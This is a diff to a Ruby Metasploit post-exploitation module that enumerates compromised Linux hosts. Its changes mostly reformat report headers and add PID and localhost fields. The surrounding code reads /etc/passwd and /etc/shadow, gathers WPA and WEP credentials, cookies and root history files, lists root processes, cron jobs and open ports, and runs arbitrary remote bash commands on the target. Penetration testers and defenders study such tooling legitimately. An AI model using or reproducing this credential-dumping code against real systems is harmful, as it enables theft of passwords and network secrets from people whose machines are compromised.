@@ -161,9 +161,10 @@ def run
     #
     # Local variable declarations (msf API calls)
     #
-    sys_info = session.sys.config.sysinfo
     host_ip = client.session_host
     payload_path = client.fs.dir.pwd
+    sys_info = session.sys.config.sysinfo
+    session_pid = client.sys.process.getpid
     #
     # check for proper target operative system (Linux)
     #
@@ -217,7 +218,8 @@ def run
       mem_total = cmd_exec("cat /proc/meminfo | grep \"MemTotal\" | awk {'print $2,$3'}")
       model_name = cmd_exec("lscpu | grep \"Model name:\" | awk {'print $3,$4,$5,$6,$7,$8,$9,$10'}")
       distro_description = cmd_exec("cat /etc/*-release | grep 'DISTRIB_DESCRIPTION=' | cut -d '=' -f2")
-        print_status("Storing results into msf database ..")
+      localhost_ip = cmd_exec("ping -c 1 localhost | head -n 1 | awk {'print $3'} | cut -d '(' -f2 | cut -d ')' -f1")
+        print_status("Storing scan results into msf database ..")
         Rex::sleep(0.5)
         #
         # Store data into a local variable (data_dump) ..
@@ -228,6 +230,7 @@ def run
         data_dump << "----------------------------------------\n"
         data_dump << "Running on session  : #{datastore['SESSION']}\n"
         data_dump << "Target Computer     : #{sys_info['Computer']}\n"
+        data_dump << "Target session PID  : #{session_pid}\n"
         data_dump << "Target Architecture : #{sys_info['Architecture']}\n"
         data_dump << "Target Arch (bits)  : #{hardware_bits}\n"
         data_dump << "Target Arch (vendor): #{hardware_vendor}\n"
@@ -238,30 +241,31 @@ def run
         data_dump << "Target interface    : #{interface}\n"
         data_dump << "Target IP addr      : #{host_ip}\n"
         data_dump << "Target gateway      : #{gateway}\n"
+        data_dump << "Target localhost    : #{localhost_ip}\n"
         data_dump << "Payload directory   : #{payload_path}\n"
         data_dump << "Client UID          : #{target_uid}\n"
         data_dump << "Distro description  : #{distro_description}\n"
         data_dump << "Operative System    : #{sys_info['OS']}\n"
         data_dump << "Distro uname        : #{distro_uname}\n"
         data_dump << "\n\n\n"
-        data_dump << "FILE SYSTEM\n"
-        data_dump << "------------\n"
+        data_dump << "FILE SYSTEM :\n"
+        data_dump << "-------------\n"
         data_dump << file_sys
         data_dump << "\n\n"
-        data_dump << "STORAGE DEVICES\n"
-        data_dump << "------------\n"
+        data_dump << "STORAGE DEVICES :\n"
+        data_dump << "-----------------\n"
         data_dump << storage_mont
         data_dump << "\n\n"
-        data_dump << "CURRENT SHELL\n"
-        data_dump << "-------------\n"
+        data_dump << "CURRENT SHELL :\n"
+        data_dump << "---------------\n"
         data_dump << current_shell
         data_dump << "\n\n"
-        data_dump << "DEFAULT SYSTEM SHELL\n"
-        data_dump << "--------------------\n"
+        data_dump << "DEFAULT SHELL :\n"
+        data_dump << "---------------\n"
         data_dump << default_shell
         data_dump << "\n\n"
-        data_dump << "AVAILABLE SHELLS\n"
-        data_dump << "----------------\n"
+        data_dump << "AVAILABLE SHELLS :\n"
+        data_dump << "------------------\n"
         data_dump << distro_shells
         data_dump << "\n\n"
 
@@ -283,7 +287,7 @@ def run
           root_services = cmd_exec("ps -aux | grep '^root'")
           distro_history = cmd_exec("ls -la /root/.*_history")
           distro_logs = cmd_exec("find /var/log -type f -perm -4")
-            print_status("Storing results into msf database ..")
+            print_status("Storing scan results into msf database ..")
             Rex::sleep(0.5)
             #
             # store data into a local variable (data_dump) ..
@@ -293,28 +297,28 @@ def run
             data_dump << "|  AGRESSIVE SCAN REPORTS  |\n"
             data_dump << "+--------------------------+\n"
             data_dump << "\n\n"
-            data_dump << "ROOT SERVICES RUNNING\n"
-            data_dump << "---------------------\n"
-            data_dump << root_services
-            data_dump << "\n\n"
-            data_dump << "LIST OF HISTORY FILES\n"
-            data_dump << "---------------------\n"
-            data_dump << distro_history
-            data_dump << "\n\n"
-            data_dump << "LIST OF LOGFILES FOUND\n"
-            data_dump << "----------------------\n"
-            data_dump << distro_logs
-            data_dump << "\n\n"
-            data_dump << "CRONTAB TASKS\n"
-            data_dump << "-------------\n"
-            data_dump << cron_tasks
-            data_dump << "\n\n"
-            data_dump << "TARGET OPEN PORTS\n"
-            data_dump << "-----------------\n"
+            data_dump << "TARGET OPEN PORTS :\n"
+            data_dump << "-------------------\n"
             data_dump << net_stat
             data_dump << "\n\n"
-            data_dump << "SMBIOS DATA (sysfs)\n"
-            data_dump << "-------------------\n"
+            data_dump << "ROOT SERVICES RUNNING :\n"
+            data_dump << "-----------------------\n"
+            data_dump << root_services
+            data_dump << "\n\n"
+            data_dump << "CRONTAB TASKS :\n"
+            data_dump << "---------------\n"
+            data_dump << cron_tasks
+            data_dump << "\n\n"
+            data_dump << "LIST OF HISTORY FILES :\n"
+            data_dump << "-----------------------\n"
+            data_dump << distro_history
+            data_dump << "\n\n"
+            data_dump << "LIST OF LOGFILES FOUND :\n"
+            data_dump << "------------------------\n"
+            data_dump << distro_logs
+            data_dump << "\n\n"
+            data_dump << "SMBIOS DATA (sysfs) :\n"
+            data_dump << "---------------------\n"
             data_dump << demi_bios
             data_dump << "\n\n"
         end
@@ -339,7 +343,7 @@ def run
           # dump etc/passwd & etc/shadow files from target
           etc_pass = cmd_exec("cat /etc/passwd")
           etc_shadow = cmd_exec("cat /etc/shadow")
-            print_status("Storing results into msf database ..")
+            print_status("Storing scan results into msf database ..")
             Rex::sleep(0.5)
             #
             # store data into a local variable (data_dump) ..
@@ -349,24 +353,24 @@ def run
             data_dump << "|  REMOTE CREDENTIALS DUMP |\n"
             data_dump << "+--------------------------+\n"
             data_dump << "\n\n"
-            data_dump << "WPA CREDENTIALS:\n"
-            data_dump << "----------------\n"
+            data_dump << "WPA CREDENTIALS :\n"
+            data_dump << "-----------------\n"
             data_dump << wpa_out
             data_dump << "\n\n"
-            data_dump << "WEP CREDENTIALS:\n"
-            data_dump << "----------------\n"
+            data_dump << "WEP CREDENTIALS :\n"
+            data_dump << "-----------------\n"
             data_dump << wep_out
             data_dump << "\n\n"
-            data_dump << "ETC/PASSWD     :\n"
-            data_dump << "----------------\n"
+            data_dump << "ETC/PASSWD :\n"
+            data_dump << "------------\n"
             data_dump << etc_pass
             data_dump << "\n\n"
-            data_dump << "ETC/SHADOW     :\n"
-            data_dump << "----------------\n"
+            data_dump << "ETC/SHADOW :\n"
+            data_dump << "------------\n"
             data_dump << etc_shadow
             data_dump << "\n\n"
-            data_dump << "LIST COOKIES   :\n"
-            data_dump << "----------------\n"
+            data_dump << "LIST COOKIES :\n"
+            data_dump << "--------------\n"
             data_dump << list_cookies
             data_dump << "\n\n"
             data_dump << list_sqlite
@@ -386,7 +390,7 @@ def run
           Rex::sleep(0.5)
           # bash command to be executed remotelly ..
           single_comm = cmd_exec("#{exec_bash}")
-            print_status("Storing results into msf database ..")
+            print_status("Storing scan results into msf database ..")
             Rex::sleep(0.5)
             #
             # store data into a local variable (data_dump) ..
@@ -407,7 +411,7 @@ def run
        # All scans finished ..
        # Displaying results on screen (data_dump) ..
        #
-       print_status("Remote scans completed, building list ..")
+       print_good("Remote scans completed, building list ..")
        Rex::sleep(2.0)
        # print the contents of 'data_dump' variable on screen ..
        print_line(data_dump)
